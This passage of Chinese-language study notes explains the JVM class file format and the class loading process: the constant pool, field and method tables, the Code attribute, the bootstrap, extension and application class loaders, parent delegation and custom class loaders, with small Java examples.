表开始的第一位是一个u1类型的标志位（1-12，缺少2），代表当前这个常量属于的常量类型。14种常量类型所代表的具体含义如下表所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131605.png)\n\n这14种常量类型各自均有自己的结构。以CONSTANT_Class_info型常量为例，该结构中有一项name_index属性，该常属性中存放一个索引值，指向常量池中一个CONSTANT_Utf8_info类型的常量，该常量中即保存了该类的全限定名字符串。而CONSTANT_Fieldref_info、CONSTANT_Methodref_info、CONSTANT_InterfaceMethodref_info型常量的结构中都有一项index属性，存放该字段或方法所属的类或接口的描述符CONSTANT_Class_info的索引项。另外，最终保存的诸如Class名、字段名、方法名、修饰符等字符串都是一个CONSTANT_Utf8_info类型的常量，也因此，Java中方法和字段名的最大长度也即是CONSTANT_Utf8_info型常量的最大长度，在CONSTANT_Utf8_info型常量的结构中有一项length属性，它是u2类型的，即占用2个字节，那么它的最大的length即为65535。因此，Java程序中如果定义了超过64KB英文字符的变量或方法名，将会无法编译。\n\n**常量池中14种常量项的结构总表**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131620.png)\n\n**为什么需要常量池？**\n一个java源文件中的类、接口，编译后产生一个字节码文件。而java中的字节码需要数据支持，通常这种数据会很大以至于不能直接存到字节码里，换另一种方式，可以存到常量池，这个字节码包含了指向常量池的引用。在动态链接的时候会用到运行时常量池。\n\n## access_flag\n在常量池结束之后，紧接着的2个字节代表访问标志（access_flag），这个标志用于识别一些类或接口层次的访问信息，包括：这个Class是类还是接口，是否定义为public类型，abstract类型，如果是类的话，是否声明为final，等等。每种访问信息都由一个十六进制的标志值表示，如果同时具有多种访问信息，则得到的标志值为这几种访问信息的标志值的逻辑或。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131634.png)\n\n## this_class、super_class、interfaces\n类索引（this_class）和父类索引（super_class）都是一个u2类型的数据，而接口索引集合（interfaces）则是一组u2类型的数据集合，Class文件中由这三项数据来确定这个类的继承关系。类索引、父类索引和接口索引集合都按照顺序排列在访问标志之后，类索引和父类索引两个u2类型的索引值表示，它们各自指向一个类型为COMNSTANT_Class_info的类描述符常量，通过该常量中的索引值找到定义在COMNSTANT_Utf8_info类型的常量中的全限定名字符串。而接口索引集合就用来描述这个类实现了哪些接口，这些被实现的接口将按implements语句（ 如果这个类本身是个接口，则应当是extend语句）后的接口顺序从左到右排列在接口的索引集合中。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131649.png)\n\n## field_info\n字段表（field_info）用于描述接口或类中声明的变量。字段包括了类级变量或实例级变量，但不包括在方法内声明的变量。java中描述一个字段可以包含的信息有：字段的作用域(public、private、protected修饰符),是实例变量还是类变量(static修饰符),可变性(final修饰符), 并发可见性(volatile修饰符), 可否被序列化(transient修饰符), 字段基本类型，字段名称等。上述这些信息中，各个修饰符都是布尔值，要么有某个修饰符，要么没有，很适合使用标志位来表示，而字段叫什么名字、字段被定义成什么数据类型，这些都是无法固定的，只能引用常量池中的常量来描述。下面是字段表的最终格式：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131702.png)\n字段修饰符放在access_flags项目中，它与类和接口中的access_flags项目是非常类似的，都是一个u2的数据类型，其中可以设置的标志位和含义见下图：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131717.png)\n\nname_index和descriptor_index都是对常量池的引用，分别代表字段的简单名称及字段和方法的JNI描符符。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131730.png)\n\n**最后需要注意一点：字段表集合中不会列出从父类或接口中继承而来的字段，但有可能列出原本Java代码中不存在的字段。比如在内部类中为了保持对外部类的访问性，会自动添加指向外部类实例的字段。**\n\n## method_info\n方法表（method_info）的结构与属性表的结构相同，方法里的Java代码，经过编译器编译成字节码指令后，存放在方法属性表集合中一个名为“Code”的属性里，关于属性表的项目，同样会在后面详细介绍。\n\n**与字段表集合相对应，如果父类方法在子类中没有被覆写，方法表集合中就不会出现来自父类的方法信息。但同样，有可能会出现由编译器自动添加的方法，最典型的便是类构造器`<clinit>`方法和实例构造器`<init>`方法。**\n\n在Java语言中，要重载一个方法，除了要与原方法具有相同的简单名称外，还要求必须拥有一个与原方法不同的特征签名，特征签名就是一个方法中各个参数在常量池中的字段符号引用的集合，也就是因为返回值不会包含在特征签名之中，因此Java语言里无法仅仅依靠返回值的不同来对一个已有方法进行重载。\n\n## attribute_info\n属性表（attribute_info）在前面已经出现过多系，在Class文件、字段表、方法表中都可以携带自己的属性表集合，以用于描述某些场景专有的信息。\n\n属性表集合的限制没有那么严格，不再要求各个属性表具有严格的顺序，并且只要不与已有的属性名重复，任何人实现的编译器都可以向属性表中写入自己定义的属性信息，但Java虚拟机运行时会忽略掉它不认识的属性。Java虚拟机规范中预定义了9项虚拟机应当能识别的属性（JDK1.5后又增加了一些新的特性，因此不止下面9项），如下是其中一些属性中的关键常用的部分：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131740.png)\n\n对于每个属性，它的名称都需要从常量池中引用一个CONSTANT_Utf8_info类型的常量来表示，每个属性值的结构是完全可以自定义的，只需说明属性值所占用的位数长度即可。一个符合规则的属性表至少应具有“attribute_name_info”、“attribute_length”和至少一项信息属性。\n\n### Code属性\n前面已经说过，Java程序方法体中的代码讲过Javac编译后，生成的字节码指令便会存储在Code属性中，但并非所有的方法表都必须存在这个属性，比如接口或抽象类中的方法就不存在Code属性。如果方法表有Code属性存在，那么它的结构将如下表所示：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131752.png)\n\n**attribute_name_index，attribute_length**\nattribute_name_index是一项指向CONSTANT_Utf8_info型常量的索引，常量值固定为“Code”，它代表了该属性的名称。attribute_length指示了属性值的长度，由于属性名称索引与属性长度一共是6个字节，所以属性值的长度固定为整个属性表的长度减去6个字节。\n\n**max_stack，max_locals**\nmax_stack代表了操作数栈深度的最大值，max_locals代表了局部变量表所需的存储空间，它的单位是Slot，并不是在方法中用到了多少个局部变量，就把这些局部变量所占Slot之和作为max_locals的值，原因是局部变量表中的Slot可以重用。\n\n**code_length**\ncode_length和code用来存储Java源程序编译后生成的字节码指令。code用于存储字节码指令的一系列字节流，它是u1类型的单字节，因此取值范围为0x00到0xFF，那么一共可以表达256条指令，目前，Java虚拟机规范已经定义了其中200条编码值对应的指令含义。code_length虽然是一个u4类型的长度值，理论上可以达到2^32-1，但是虚拟机规范中限制了一个方法不允许超过65535条字节码指令，如果超过了这个限制，Javac编译器将会拒绝编译。\n\n**exception_table**\n字节码指令之后是这个方法的显式异常处理表集合（exception_table），它对于Code属性来说并不是必须存在的。它的格式如下表所示：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131805.png)\n\n它包含四个字段，这些字段的含义为：如果字节码从第start_pc行到第end_pc行之间（不含end_pc行）出现了类型为catch_type或其子类的异常（catch_type为指向一个CONSTANT_Class_info型常量的索引），则转到第handler_pc行继续处理，当catch_pc的值为0时，代表人和的异常情况都要转到handler_pc处进行处理。异常表实际上是Java代码的一部分，编译器使用异常表而不是简单的跳转命令来实现Java异常即finally处理机制，也因此，finally中的内容会在try或catch中的return语句之前执行\n\nCode属性是Class文件中最重要的一个属性，如果把一个Java程序中的信息分为代码和元数据两部分，那么在整个Class文件里，Code属性用于描述代码，所有的其他数据项目都用于描述元数据。\n\n### Exception属性\n这里的Exception属是在方法表中与Code属性平级的一项属性，不要与Code属性中的exception_table产生混淆。Exception属性的作用是列举出方法中可能抛出的受查异常，也就是方法描述时在throws关键字后面列举的异常。它的结构很简单，只有attribute_name_index、attribute_length、number_of_exceptions、exception_index_table四项，从字面上便很容易理解，这里不再详述。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131815.png)\n\n# 类加载\n<font color=\"red\">注：加载不等于类加载，加载只是类加载中的一个阶段</font>\n\n其中类加载的过程包括了加载(Loading)、验证(Verification)、准备(Preparation)、解析(Resolution)、初始化(Initialization)五个阶段。在这五个阶段中，加载、验证、准备和初始化这四个阶段发生的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后开始，这是为了支持Java语言的运行时绑定（也成为动态绑定或晚期绑定）。另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。\n\n这里简要说明下Java中的绑定：绑定指的是把一个方法的调用与方法所在的类(方法主体)关联起来，对java来说，绑定分为静态绑定和动态绑定：\n- 静态绑定：即前期绑定。在程序执行前方法已经被绑定，此时由编译器或其它连接程序实现。针对java，简单的可以理解为程序编译期的绑定。java当中的方法只有final，static，private和构造方法是前期绑定的。\n- 动态绑定：即晚期绑定，也叫运行时绑定。在运行时根据具体对象的类型进行绑定。在java中，几乎所有的方法都是后期绑定的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131828.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131838.png)\n\n<span id=\"loading\"></span>\n\n## 加载\n加载时类加载过程的第一个阶段，在加载阶段，虚拟机需要完成以下三件事情：\n1. 通过一个类的全限定名来获取其定义的二进制字节流。\n2. 将这个字节流所代表的存储结构转化为方法区的运行时数据结构。\n3. 在Java堆中生成一个代表这个类的java.lang.Class对象，**作为对方法区中这些数据的访问入口。**\n注意，这里第1条中的二进制字节流并不只是单纯地从Class文件中获取，比如它还可以从Jar包中获取、从网络中获取（最典型的应用便是Applet）、由其他文件生成（JSP应用）等。\n\n相对于类加载的其他阶段而言，加载阶段（准确地说，是加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，因为开发人员既可以使用系统提供的类加载器来完成加载，也可以自定义自己的类加载器来完成加载。\n\n加载阶段完成后，虚拟机外部的二进制字节流就按照虚拟机所需的格式存储在方法区之中，而且在Java堆中也创建一个java.lang.Class类的对象，这样便**可以通过该对象访问方法区中的这些数据，**俗称反射\n\n\n### 类加载器\n说到加载，不得不提到类加载器，下面就具体讲述下类加载器。\n\n类型的加载是通过类加载器来进行加载的，类加载器虽然只用于实现类的加载动作，但它在Java程序中起到的作用却远远不限于类的加载阶段。对于任意一个类，都需要由它的类加载器和这个类本身一同确定其在就Java虚拟机中的唯一性，也就是说，即使两个类来源于同一个Class文件，只要加载它们的类加载器不同，那这两个类就必定不相等。这里的“相等”包括了代表类的Class对象的equals（）、isAssignableFrom（）、isInstance（）等方法的返回结果，也包括了使用instanceof关键字对对象所属关系的判定结果。\n\n从Java虚拟机的角度来说，只存在两种不同的类加载器：\n- 启动类加载器（Bootstrap ClassLoader），这个类加载器使用C++语言实现（HotSpot虚拟机中），是虚拟机自身的一部分；\n- 所有其他的类加载器，这些类加载器都有Java语言实现，独立于虚拟机外部，并且全部继承自java.lang.ClassLoader。\n\n从开发者的角度，类加载器可以细分为：\n- 系统级别\n  - 启动类加载器(根类加载器)：Bootstrap ClassLoader\n  - 扩展类加载器：Extension ClassLoader\n  - 应用程序类加载器（系统类加载器）：Application ClassLoader\n- 用户级别\n通过继承ClassLoader, 来自定义类加载器\n\n### 启动类加载器(根类加载器)：Bootstrap ClassLoader\n根类加载器是最底层的类加载器，是虚拟机的一部分，它是由C++语言实现的，且没有父加载器，也没有继承java.lang.ClassLoader类，他主要负责加载由系统属性“sun.boot.class.path”指定的路径下的核心类库（即`<JAVA_HOME>\\jre\\lib`）,出于安全考虑，根类加载器只加载java、javax、sun开头的类。\n```java\npublic class Main{\n  public static void main(String[] args){\n    ClassLoader cl = Object.class.getClassLoader(); \n    System.out.println(cl); //输出Null， 不代表Object没有类加载器，而是代表Object的类加载器为启动类加载器，而在java中，启动类加载器输出为null\n  }\n}\n```\n\n### 扩展类加载器：Extension ClassLoade\n扩展类加载器是指由SUN公司实现的sun.misc.Launcher$ExtClassLoader类（JDK9是jdk.internal.loader.ClassLoaders$PlatformClassLoader类），它是由java语言编写，父加载器是启动类加载器，负责加载`<JAVA_HOME>\\jre\\lib\\ext`目录下的类库或者系统变量“java.ext.dirs”指定的目录下的类库。\n以下是ExtClassLoader加载目录源码：\n```java\nprivate static File[] getExtDirs(){\n  String s = System.getProperty(java.ext.dirs);\n  File[] dirs;\n  if( s != null){\n    StringTokenizer st = new StringTokenizer(s, File.pathSeparator);\n    int count = st.countTokens();\n    dirs = new File[count];\n    for(int i = 0; i < count; i++){\n      dirs[i] = new Files(st.nextToken());\n    }\n  }else{\n    dirs = new File[0];\n  }\n  return dirs;\n}\n```\n例如我当前`<JAVA_HOME>\\jre\\lib\\ext`目录如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131850.png)\n其中dnsns.jar包如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131908.png)\n我们可以发现DNSNameService类的一定是通过扩展类类加载器来加载的；我们可以通过如下代码来验证\n```java\nClassLoader cl = DNSNameService.class.getClassLoader();\nSystem.out.println(\"DNSNameService\"); // 输出为sun.misc.Launcher$ExtClassLoader@677327b6\n```\n\n### 应用程序类加载器（系统类加载器）：Application ClassLoader\n系统类加载器也称之为应用类加载器，也是纯java类，是原SUN公司实现的sun.misc.Launcher$AppClassLoader类（JDK9是jdk.internal.loader.ClassLoaders$AppClassLoader）。它的父加载器是扩展类加载器。他负责从classpath环境变量或者系统属性java.class.path所指定的目录中加载类。它是用户自定义的类加载器的默认父加载器。一般情况下，是由该类加载器来加载我们自己写的java程序，可以通过ClassLoader.getSystemClassLoader()直接获取。\n```java\npublic class Main{\n  public static void main(String[] args){\n    ClassLoader cl = Main.class.getClassLoader(); \n    System.out.println(cl); //输出：sun.misc.Launcher$AppClassLoader\n  }\n}\n```\n\n### 小结\n在程序开发中，类的加载几乎是由上述3种类加载器相互配合执行的，同时我们还可以自定义类加载器、需要注意的是，java虚拟机对class文件采用的是按需加载的方式，也就是说需要使用该类时才会将它的class文件加载到内存生成class对象，而且加载某个类的class文件时，java虚拟机采用的是双亲委派模式，即把加载类的请求交由父加载器处理，它一种任务委派模式。\n\n#### 类加载层级结构\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132012.png)\n该模型要求除了顶层的启动类加载器外，其余的类加载器都应该有自己的父类加载器，而这种父子关系一般通过组合（Composition）关系来实现，而不是通过继承（Inheritance）。\n\n通过java代码来得到每个加载器加载了那些类\n```java\n\t/**\n启动类加载器加载的职责\n*/\npublic static void bootClassLoaderLoadingPath(){\n\t//获取启动类加载器加载的目录\n\tString bootStrapLoadingPath = System.getProperty(\"sun.boot.class.path\");\n\t//把加载的目录转为集合\n\tList<String> bootLoadingPathList = Arrays.asList(bootStrapLoadingPath.split(\";\"));\n\n\tfor(String bootPath:bootLoadingPathList){\n\t\tSystem.out.println(\"[启动类加载器----加载的目录]\"+bootPath);\n\t}\n} \n\n/**\n扩展类加载器加载的职责\n*/\npublic static void extClassLoaderLoadingPath(){\n\t//获取扩展类加载器加载的目录\n\tString extClassLoadingPath = System.getProperty(\"java.ext.dirs\");\n\t//把加载的目录转为集合\n\tList<String> extLoadingPathList = Arrays.asList(extClassLoadingPath.split(\";\"));\n\n\tfor(String exPath:extLoadingPathList){\n\t\tSystem.out.println(\"[扩展类加载器----加载的目录]\"+extPath);\n\t}\n} \n\n/**\n系统类加载器加载的职责\n*/\npublic static void extClassLoaderLoadingPath(){\n\t//获取系统类加载器加载的目录\n\tString appClassLoadingPath = System.getProperty(\"java.class.path\");\n\t//把加载的目录转为集合\n\tList<String> appClassLoadingPathList = Arrays.asList(appClassLoadingPath.split(\";\"));\n\n\tfor(String appPath:appClassLoadingPathList){\n\t\tSystem.out.println(\"[系统类加载器----加载的目录]\"+appPath);\n\t}\n} \n```\n\n#### 双亲委派模型\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132024.png)\n这种层次关系称为类加载器的双亲委派模型。我们把每一层上面的类加载器叫做当前层类加载器的父加载器，当然，它们之间的父子关系并不是通过继承关系来实现的，而是使用组合关系来复用父加载器中的代码。该模型在JDK1.2期间被引入并广泛应用于之后几乎所有的Java程序中，但它并不是一个强制性的约束模型，而是Java设计者们推荐给开发者的一种类的加载器实现方式。\n\n双亲委派模型的工作流程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把请求委托给父加载器去完成，依次向上，因此，所有的类加载请求最终都应该被传递到顶层的启动类加载器中，只有当父加载器在它的搜索范围中没有找到所需的类时，即无法完成该加载，子加载器才会尝试自己去加载该类。\n\n**使用双亲委派机制的好处：**\n1. 可以避免类的重复加载，当父类加载器已经加载了该类时，就没有必要子ClassLoader再加载一次。\n2. 考虑到安全因素，java核心api中定义类型不会被随意替换，假设通过网络传递一个名为java.lang.Object的类，通过双亲委派模式传递到启动类加载器，而启动类加载器在核心java API发现这个名字的类，发现该类已被加载，并不会重新加载网络传递过来的java.lang.Object，而直接返回已加载过多Object.class，这样便可以防止核心API库被随意篡改。\n```java\n//注意包名\npackage java.lang;\n\npublic class Main{\n  public static void main(String[] args){\n  }\n}\n```\n以上代码编译时，会报如下错误：\n```\nMain.java:1: 错误: 程序包已存在于另一个模块中: java.base\npackage java.lang;\n```\n因为java.lang包属于核心包，只能由启动类类加载器进行加载，而根据类加载的双亲委派机制，启动类类加载器是加载不到这个Main类的，所以只能由AppClassLoader进行加载，而这又不是允许的，所以会报以上错误；\n\n**演示类加载器的父子关系**\n```java\npublic class Main{\n  public static void main(String[] args){\n    ClassLoader loader = Main.class.getClassLoader(); \n    while(loader != null){\n      System.out.println(loader);\n      loader = loader.getParent();\n    }\n  }\n}\n```\n输出结果：\n```\nsun.misc.Launcher$AppClassLoader@18b4aac2\nsun.misc.Launcher$ExtClassLoader@1b6d3586\n```\n\n### ClassLoader\n所有的类加载器（除了启动类类加载器）都必须继承java.lang.ClassLoader。它是一个抽象类，主要的方法如下：\n\n#### loadClass\n在ClassLoader的源码中，有一个方法loadClass(String name, boolean resolve), 这里就是双亲委派模式多代码实现。从源码中我们可以观察到它的执行顺序。需要注意的是，只有父类加载器加载不到类时，才会调用findClass方法进行类的查找，所以，在定义自己的类加载器时，不要覆盖该方法，而应该覆盖掉findClass方法。\n```java\nprotected Class<?> loadClass(String name, boolean resolve)\n        throws ClassNotFoundException\n    {\n        synchronized (getClassLoadingLock(name)) {\n            // 若本加载器之前是否已加载过，直接取缓存，native方法实现\n            Class c = findLoadedClass(name);\n            if (c == null) {\n                try {\n                    // 只要有父加载器就先委派父加载器来加载\n                    if (parent != null) {\n                        // 注意此处递归调用\n                        c = parent.loadClass(name, false);\n                    } else {\n                        // ext的parent为null，因为Bootstrap是无法被程序被访问的，默认parent为null时其父加载器就是Bootstrap\n                        // 此时直接用native方法调用启动类加载加载，若找不到则抛异常\n                        c = findBootstrapClassOrNull(name);\n                    }\n                } catch (ClassNotFoundException e) {\n                    // 对ClassNotFoundException不做处理，仅用作退出递归\n                }\n\n                if (c == null) {\n                    // 如果父加载器无法加载那么就在本类加载器的范围内进行查找\n                    // findClass找到class文件后将调用defineClass方法把字节码导入方法区，同时缓存结果\n                    c = findClass(name);\n                }\n            }\n            // 是否解析，默认false\n            if (resolve) {\n                resolveClass(c);\n            }\n            return c;\n        }\n    }\n```\n过程讲解：\n使用指定的二进制名称来加载类，此loadClass方法的默认实现将按以下顺序搜索类：\n1. 调用findLoadedClass(String)来检查是否已经加载类\n2. 在父类加载器上调用loadClass方法。如果父类加载器为null，则使用虚拟机的内置加载器\n3. 调用findClass(String)方法查找类\n如果使用上述步骤找到类，并且resolve标志为true，则此方法将在得到的Class对象上调用resolveClass(Class)方法。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132035.png)\n\n#### findClass\n在自定义类加载时，一般我们需要覆盖这个方法，且ClassLoader中给出了一个默认的错误实现, 如下：\n```java\nprotected class<?> findClass(String name) throws ClassNotFoundException{\n  throw new ClassNotFoundException(name);\n}\n```\n\n#### defineClass\n该方法的签名如下。用来将byte字节解析成虚拟机能够识别的Class对象。defineClass()方法通过与findClass()方法一起使用。在自定义类加载器时，会直接覆盖ClassLoader的findClass()方法获取要加载\b的类的字节码，然后调用defineClass()方法生产Class对象。\n```java\nprotected final class<?> defineClass(String name, byte[] b, int off, int len) throws ClassFormatError\n```\n\n#### resolveClass\n连接指定的类，类加载器可以使用此方法来连接类\n\n\n### URLClassLoader\n在java.net包中，JDK提供了一个更加易用的类加载器器URLClassLoader，它扩展了ClassLoader，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。\n\n构造方法：\n- public URLClassLoader(URL[] urls): 指定要加载的类所在的URL地址，父类加载器默认为应用程序加载器\n- public URLClassLoader(URL[] urls, ClassLoader parent): 指定要加载的类所在的URL地址，并制定父类加载器\n\n#### 案例1: 加载磁盘上的类\n1. 首先在D盘上创建一个Demo类，如下：\n```java\npackage com.itheima;\n\npublic class Demo{\n  ... \n}\n```\n2. 使用`javac -d . Demo.java`命令编译\n3. 然后使用如下方式来加载这个Demo字节码文件\n```java\npublic class URLClassLoaderDemo{\n  public static void main(String[] args) throws Exception{\n    File file = new File(\"d:/\");\n    URL uri = file.toURL();\n    URL url = uri.toURL();\n    URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n    System.out.println(classLoader.getParent());\n    Class aClass = classLoader.loadClass(\"com.itheima.Demo\");\n    Object obj = aClass.newInstance();\n  }\n}\n```\n\n#### 案例2:加载网络上的类\n```java\npublic static void main(String[] args) throws Exception{\n  URL url = new URL(\"http://localhost:8080/examples/\");\n  URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n  System.out.println(classLoader.getParent());\n  Class aClass = classLoader.loadClass(\"com.itheima.Demo\");\n  aClass.newInstance();\n}\n```\n\n### 自定义类加载器\n我们如果需要自定义类加载器，只需要继承ClassLoader类，并覆盖掉findClass方法即可。\n#### 自定义文件类加载器\n1. 在`~/Temp/java/classLoaderTest`目录下有如下类：\n```\nwanghengzhi@:~/Temp/java/classLoaderTest$ lla\ntotal 24\ndrwxr-xr-x   5 wanghengzhi  staff   160 11  2 14:20 .\ndrwxr-xr-x  18 wanghengzhi  staff   576 11  2 13:53 ..\n-rw-r--r--   1 wanghengzhi  staff   101 11  2 14:17 Demo.java\n-rw-r--r--   1 wanghengzhi  staff   322 11  2 14:18 Main.java\n-rw-r--r--   1 wanghengzhi  staff  1044 11  2 14:17 MyFileClassLoader.java\nwanghengzhi@:~/Temp/java/classLoaderTest$ \n```\n2. Demo.java文件如下：\n```java\npackage com.whz;\n\npublic class Demo{\n  public Demo(){\n    System.out.println(\"Demo instance\");\n  }\n}\n```\n3. MyFileClassLoader.java文件如下：\n```java\npackage com.whz;\n\nimport java.io.*;\n\n//1.继承ClassLoader类\n//2.重写findClass方法 \npublic class MyFileClassLoader extends ClassLoader{\n  private String directory;\n  public MyFileClassLoader(String directory){\n    this.directory = directory;\n  }\n\n  public MyFileClassLoader(String directory, ClassLoader parent){\n    super(parent);\n    this.directory = directory;\n  }\n\n  @Override\n  protected Class<?> findClass(String name) throws ClassNotFoundException{\n    try{\n      //将类名转换为目录\n      String file = directory + name.replaceAll(\",\", File.separator) + \".class\";\n      //构建输入流\n      InputStream in = new FileInputStream(file);\n      //构建字节输出流\n      ByteArrayOutputStream baos = new ByteArrayOutputStream();\n      byte[] buf = new byte[1024];\n      int len = -1;\n      while((len = in.read(buf)) != -1){\n        baos.write(buf,0,len);\n      }\n      byte[] data = baos.toByteArray();\n      in.close();\n      baos.close();\n      return defineClass(name, data, 0, data.length);\n    }catch(IOException e){\n      throw new RuntimeException(e);\n    }\n  }\n}\n```\n3. Main.java文件如下：\n```java\npackage com.whz;\n\nimport com.whz.MyFileClassLoader;\n\npublic class Main{\n  public static void main(String[] args) throws Exception{\n    MyFileClassLoader myFileClassLoader = new MyFileClassLoader(\"~/Temp/java/classLoaderTest\");\n    Class clazz = myFileClassLoader.loadClass(\"com.whz.Demo\");\n    clazz.newInstance();\n  } \n}\n```\n\n4. 编译\\运行项目\n```shell\nwanghengzhi@:~/Temp/java/classLoaderTest$ javac -d . $(find . -name '*.java')\n注: ./Main.java使用或覆盖了已过时的 API。\n注: 有关详细信息, 请使用 -Xlint:deprecation 重新编译。\nwanghengzhi@:~/Temp/java/classLoaderTest$ tree\n.\n├── Demo.java\n├── Main.java\n├── MyFileClassLoader.java\n└── com\n    └── whz\n        ├── Demo.class\n        ├── Main.class\n        └── MyFileClassLoader.class\n\n2 directories, 6 files\nwanghengzhi@:~/Temp/java/classLoaderTest$ java com/whz/Main\nDemo instance\nwanghengzhi@:~/Temp/java/classLoaderTest$ \n```\n\n### 类的显示与隐式加载\n类的加载方式是指虛拟机将class文件加载到内存的方式。\n- 显式加载是指在java代码中通过调用ClassLoader加载class对象，比如Class.forName(String name);this.getClass().getClassLoader().loadClass()加载类。\n- 隐式加载指不需要在java代码中明确调用加载的代码，而是通过虚拟机自动加载到内存中。比如在加载某个class时，该class引用了另外一个类的对象了那么这个对象的字节码文件就会被虛拟机自动加载到内存中。\n\n### 线程上下文类加载器\n在java中存在着很多的服务提供者接口SPI，全称Service Prcrider Interface，是java提供的一套用来被第三方实现或者扩展的API，这些接口一般由第三方提供实现，常见的SPI有JDBC、INDI等。这些SPI的接口（比如JDBC中的java.sql.Driver）属于核心类库，一般存在rt.jar包中，由根类加载器加载。而第三方实现的代码一般作为依赖jar包存放在classpath路径下，由于SPI接口中的代码需要加载具体的第三方实现类并调用其相关方法，SPI的接口类是由根类加载器加载的，Bootstrap类加载器无法直接加载位于classpath下的具体实现类。由于双亲委派模式的存在，Bootstrap类加载器也无法反向委托AppClassLoader加载SPI的具体实现类。在这种情况下，java提供了线程上下文类加载器用于解决以上问题\n线程上下文类加载器可以通过java.lang.Thread的getContextClassLoader(来获取，或者通过set ContextClassLoader(ClassLoader cl)来设置线程的上下文类加载器。如果没有手动设置上下文类加载器，线程将继承其父线程的上下文类加载器，初始线程的上下文类加载器是系统类加载器 (AppClassLoader），在线程中运行的代码可以通过此类加载品来加载类或资源。\n显然这种加载类的方式破坏了双亲委托模型，但它使得java类加载器变得更加灵活。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132046.png)\n\n## 类的链接过程\n当类的字节码文件被加载进JVM内存之后，JVM便会创建一个对应的Class对象（也可以叫字节码对象），把字节码指令中对常量池中的**符号引用转换为直接引用**，接着把类的字节码指令合并到JRE中。链接包含三个步骤：验证、准备、解析\n\n### 验证\n验证的目的是为了确保Class文件中的字节流包含的信息符合当前虚拟机的要求，而且不会危害虚拟机自身的安全。不同的虚拟机对类验证的实现可能会有所不同，但大致都会完成以下四个阶段的验证：文件格式的验证、元数据的验证、字节码验证和符号引用验证。\n\n### 准备\n准备阶段是**正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中分配**。对于该阶段有以下几点需要注意：\n1. 这时候进行内存分配的仅包括类变量（static），而不包括实例变量，实例变量会在对象实例化时随着对象一块分配在Java堆中。\n2. 这里所设置的初始值通常情况下是数据类型默认的零值（如0、0L、null、false等），而不是被在Java代码中被显式地赋予的值。\n假设一个类变量的定义为：`public static int value = 3；`\n那么变量value在准备阶段过后的初始值为0，而不是3，因为这时候尚未开始执行任何Java方法，而把value赋值为3的putstatic指令是在程序编译后，存放于类构造器`<clinit>()`方法之中的，所以把value赋值为3的动作将在初始化阶段才会执行。\n3. 如果类字段的属性表中存在ConstantValue属性，即同时被final和static修饰，那么在准备阶段变量value就会被初始化为ConstValue属性所指定的值。\n假设上面的类变量value被定义为： `public static final int value = 3；`\n编译时Javac将会为value生成ConstantValue属性，在准备阶段虚拟机就会根据ConstantValue的设置将value赋值为3。我们可以理解为static final常量在编译期（编译成class文件）就将其结果放入了调用它的类的常量池中\n\n### 解析\n**解析阶段是虚拟机将常量池中的符号引用转化为直接引用的过程**。在Class类文件结构一文中已经比较过了符号引用和直接引用的区别和关联，这里不再赘述。前面说解析阶段可能开始于初始化之前，也可能在初始化之后开始，虚拟机会根据需要来判断，到底是在类被加载器加载时就对常量池中的符号引用进行解析（初始化之前），还是等到一个符号引用将要被使用前才去解析它（初始化之后）。\n\n对同一个符号引用进行多次解析请求时很常见的事情，虚拟机实现可能会对第一次解析的结果进行缓存（在运行时常量池中记录直接引用，并把常量标示为已解析状态），从而避免解析动作重复进行。\n\n解析动作主要针对类或接口、字段、类方法、接口方法四类符号引用进行，分别对应于常量池中的CONSTANT_Class_info、CONSTANT_Fieldref_info、CONSTANT_Methodref_info、CONSTANT_InterfaceMethodref_info四种常量类型。\n1. 类或接口的解析：判断所要转化成的直接引用是对数组类型，还是普通的对象类型的引用，从而进行不同的解析。\n2. 字段解析：对字段进行解析时，会先在本类中查找是否包含有简单名称和字段描述符都与目标相匹配的字段，如果有，则查找结束；如果没有，则会按照继承关系从上往下递归搜索该类所实现的各个接口和它们的父接口，还没有，则按照继承关系从上往下递归搜索其父类，直至查找结束，查找流程如下图所示：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132059.png)\n最后需要注意：理论上是按照上述顺序进行搜索解析，但在实际应用中，虚拟机的编译器实现可能要比上述规范要求的更严格一些。如果有一个同名字段同时出现在该类的接口和父类中，或同时在自己或父类的接口中出现，编译器可能会拒绝编译\n3. 类方法解析：对类方法的解析与对字段解析的搜索步骤差不多，只是多了判断该方法所处的是类还是接口的步骤，而且对类方法的匹配搜索，是先搜索父类，再搜索接口。\n4. 接口方法解析：与类方法解析步骤类似，知识接口不会有父类，因此，只递归向上搜索父接口就行了。\n\n## 类初始化\n类初始化是类加载过程的最后一步，到了此阶段，才真正开始执行类中定义的Java程序代码。在准备阶段，类变量已经被赋过一次系统要求的初始值，而在初始化阶段，则是根据程序员通过程序指定的主观计划去初始化类变量和其他资源，或者可以从另一个角度来表达：初始化阶段是执行类构造器`<clinit>()`方法的过程。\n\n类初始化只进行一次（前提是被同一类加载器加载），后续使用 new 